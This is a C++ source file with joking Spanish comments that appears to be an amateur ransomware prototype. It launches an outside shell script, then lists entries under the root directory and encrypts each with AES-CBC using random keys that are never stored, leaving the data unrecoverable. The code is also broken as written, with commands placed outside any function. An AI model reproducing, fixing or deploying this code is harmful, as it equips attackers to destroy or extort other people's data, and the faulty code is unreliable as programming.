#include <iostream> // para la entrada/salida de lo que sea (esta libreria me seguira hasta el dia de mi muerte)
#include <thread>
#include <chrono>
// Que venga el gobliiiinnnn
system("bash RE_LittleGoblin.sh");
system("clear");
this_thread::sleep_for(chrono::seconds(10)); // 10 segundos hasta que continue la masacre


// Inclusión de las bibliotecas necesarias
#include <fstream> // operaciones con archivos (no esta en uso)
#include <string> // para manejo de cadenas de texto
#include <vector> // uso de memoria dinamica para el tema de los directorios
#include <cryptopp/aes.h> // implementación del algoritmo AES
#include <cryptopp/modes.h> // importamos los modulos de cifrado (usaremos el CBC)
#include <cryptopp/filters.h> // connexion de datos en las operaciones de cifrado
#include <cryptopp/files.h> // facilita mi trabajo al final
#include <cryptopp/hex.h> // para interacciones con codigo hexadecimal (no esta en uso)
#include <cryptopp/osrng.h> // generacion rapida y segura de numeros aleatorios
#include <dirent.h> // para el manejo de directorios

using namespace CryptoPP; // para evitar todo el rato escribir CryptoPP:: aparque que PP es como pito en japones y ingles jejejeje


vector<string> lsCommandOutput(const string& directory) { // funcion para obtener todos los archivos de un directorio y queden almacenados como strings en un vector
    vector<string> files; // vector para almacenar los nombres de los archivos
    DIR* dir; // directorio
    struct dirent* ent; // archivo
    if ((dir = opendir(directory.c_str())) != NULL) { // se abre el directorio MIENTRAS ESTE NO SEA NULL (espacio de vector vacio)
        while ((ent = readdir(dir)) != NULL) { // se recorre el directorio de ugual manera que anteriormente
            // Ignora los directorios '.' y '..' estos son los directorios que aparecen cuando haces ls -a 
            if (string(ent->d_name) != "." && string(ent->d_name) != "..") { 
                files.push_back(directory + "/" + string(ent->d_name));
            }
        }
        closedir(dir); // se cierra el directorio
    } else { 
        // Que no se abre ese directorio cojones
        perror(""); // imprime el error
        return files; // devuelve un vector vacío que igual se almacena
    }
    return files; // devuelve el vector con los arcivos dentro
}
int main() {

    string directory = "/";

    vector<string> files = lsCommandOutput(directory); 


for (const auto& file : files) {
    cout << "Cifrando: " << file << endl;

    // Genera una clave y un IV únicos para cada archivo
    AutoSeededRandomPool prng;
    SecByteBlock key(AES::DEFAULT_KEYLENGTH);
    SecByteBlock iv(AES::BLOCKSIZE);
    prng.GenerateBlock(key, key.size());
    prng.GenerateBlock(iv, iv.size());

    // Ruta del archivo cifrado
    string encryptedFile = file + ".aes";

    // Configura el cifrado AES en modo CBC con la clave y el IV generados
    CBC_Mode<AES>::Encryption encryption;
    encryption.SetKeyWithIV(key, key.size(), iv);

    try {
        // Cifra el archivo. FileSource toma el archivo de entrada, lo cifra y guarda el resultado
        FileSource fs(file.c_str(), true,
            new StreamTransformationFilter(encryption,
                new FileSink(encryptedFile.c_str())
            )
        );
        cout << "Archivo cifrado guardado en: " << encryptedFile << endl;
    } catch (const CryptoPP::Exception& e) {
        cerr << "Excepción durante el cifrado de " << file << ": " << e.what() << endl;
    }
}

    return 0; // Finaliza el programa exitosamente
}
